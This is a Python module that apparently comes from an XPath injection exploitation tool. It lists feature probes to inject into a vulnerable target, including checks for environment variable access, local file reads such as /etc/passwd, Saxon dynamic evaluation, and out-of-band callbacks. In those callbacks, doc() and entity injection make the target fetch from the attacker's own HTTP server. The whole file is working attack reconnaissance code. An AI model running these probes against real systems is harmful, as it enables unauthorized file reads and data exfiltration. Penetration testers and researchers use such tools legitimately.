import asyncio
from collections import namedtuple
from typing import List

from xpath import E
from xpath.functions import (available_environment_variables, boolean,
                             current_date_time, doc, doc_available,
                             document_uri, encode_for_uri, ends_with, exists,
                             generate_id, lower_case, normalize_space, string,
                             string_length, string_to_codepoints,
                             substring_before, unparsed_text_available)
from xpath.functions.fs import current_dir
from xpath.functions.saxon import evaluate

from xcat.oob import OOBHttpServer

from .algorithms import ASCII_SEARCH_SPACE
from .requester import Requester

Feature = namedtuple('Feature', 'name tests')


def test_oob(endpoint):
    async def test_func(requester: Requester):
        server = await requester.get_oob_server()
        if server is None:
            return False

        result = await requester.check(
            doc(server.location + endpoint).add_path('/data') == server.test_response_value
        )

        return result

    return test_func


features = [
    Feature('xpath-2',
            [
                lower_case('A') == 'a',
                ends_with('thetest', 'test'),
                encode_for_uri('test') == 'test'
            ]),
    Feature('xpath-3',
            [
                boolean(generate_id(E('/')))
            ]),
    Feature('normalize-space',
            [
                normalize_space('  a  b ') == 'a b'
            ]),
    Feature('substring-search',
            [
                string_length(substring_before(ASCII_SEARCH_SPACE, 'h')) == ASCII_SEARCH_SPACE.find('h'),
                string_length(substring_before(ASCII_SEARCH_SPACE, 'o')) == ASCII_SEARCH_SPACE.find('o')
            ]),
    Feature('codepoint-search',
            [
                string_to_codepoints("test")[1] == 116,
                string_to_codepoints("test")[2] == 101,
                string_to_codepoints("test")[3] == 115,
                string_to_codepoints("test")[4] == 116,
            ]),
    Feature('environment-variables',
            [
                exists(available_environment_variables())
            ]),
    Feature('document-uri',
            [
                document_uri(E('/'))
            ]),
    Feature('current-datetime',
            [
                string(current_date_time())
            ]),
    Feature('unparsed-text',
            [
                unparsed_text_available(document_uri(E('/')))
            ]),
    Feature('doc-function',
            [
                doc_available(document_uri(E('/')))
            ]),
    Feature('linux',
            [
                unparsed_text_available('/etc/passwd')
            ]),
    Feature('expath-file',
            [
                string_length(current_dir()) > 0
            ]),
    Feature('saxon',
            [
                evaluate('1+1') == 2
            ]),
    Feature('oob-http', test_oob(OOBHttpServer.test_data_url)),
    Feature('oob-entity-injection', test_oob(OOBHttpServer.test_entity_url))
]


async def detect_features(requester: Requester) -> List[Feature]:
    returner = []

    for feature in features:
        if callable(feature.tests):
            checks = [await feature.tests(requester)]
        else:
            checks = await asyncio.gather(*[requester.check(test) for test in feature.tests])

        returner.append((feature, all(checks)))

    return returner
